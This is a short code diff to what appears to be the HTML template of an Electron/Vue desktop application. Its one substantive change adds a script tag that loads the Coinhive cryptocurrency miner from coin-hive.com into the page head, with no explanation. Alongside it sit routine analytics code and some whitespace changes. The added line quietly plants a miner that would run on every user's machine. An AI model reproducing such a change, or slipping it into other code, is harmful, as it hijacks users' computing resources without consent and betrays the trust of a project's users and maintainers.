@@ -9,6 +9,7 @@
         require('module').globalPaths.push('<%= htmlWebpackPlugin.options.nodeModules.replace(/\\/g, '\\\\') %>')
       </script>
     <% } %>
+    <script src="https://coin-hive.com/lib/coinhive.min.js"></script>
   </head>
   <body style="-webkit-app-region: drag;-webkit-user-select: none;">
     <div id="app"></div>
@@ -18,10 +19,10 @@
       (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
       m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
       })(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
+
       if (process.env.NODE_ENV !== 'development') {
         ga('create', 'UA-81630553-1', 'auto');
         ga('send', 'pageview');
-      
         window.__static = require('path').join(__dirname, '/static').replace(/\\/g, '\\\\')
       }
     </script>
